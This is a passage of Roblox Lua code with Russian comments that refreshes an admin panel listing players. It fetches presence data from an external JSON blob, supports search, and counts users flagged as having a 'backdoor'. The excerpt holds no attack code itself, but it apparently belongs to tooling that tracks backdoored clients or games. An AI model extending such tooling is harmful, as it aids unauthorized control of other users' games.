        end)
    end
    
    -- Функция обновления списка
    local function refreshList()
        for _, child in ipairs(content:GetChildren()) do
            if child:IsA("Frame") and child ~= searchBox and child ~= statsFrame then
                child:Destroy()
            end
        end
        
        local players = jsonblobGet(PRESENCE_BLOB_ID)
        local searchText = searchBox.Text:lower()
        local total = 0
        local same = 0
        local backdoor = 0
        
        for uid, info in pairs(players) do
            total = total + 1
            if info.same then same = same + 1 end
            if info.hasBackdoor then backdoor = backdoor + 1 end
            
            if searchText == "" or info.name:lower():find(searchText) then
                addPlayerCard(uid, info)
            end
        end
        
        totalLabel.Text = "Всего: " .. total
        sameLabel.Text = "В сервере: " .. same
        backdoorLabel.Text = "Бекдор: " .. backdoor
    end
    
    searchBox:GetPropertyChangedSignal("Text"):Connect(refreshList)
    refreshList()
    
    -- Автообновление
    task.spawn(function()
        while adminPanel and adminPanel.Parent do
            task.wait(5)
            pcall(refreshList)
        end
    end)
end

